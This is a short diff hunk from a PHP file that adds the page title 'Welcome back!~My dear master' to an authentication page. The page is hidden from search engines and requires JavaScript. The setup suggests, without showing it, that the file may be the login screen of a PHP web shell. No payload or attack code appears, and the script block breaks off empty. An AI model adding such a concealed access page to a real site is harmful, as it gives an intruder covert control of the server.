@@ -32,6 +32,7 @@ if(!function_exists('auth')){
 		<meta charset='utf-8'>
 		<meta name='robots' content='noindex, nofollow, noarchive'>
 		<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'>
+		<title>Welcome back!~My dear master</title>
 		</head>
 		<body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p>
 		<script type='text/javascript'>
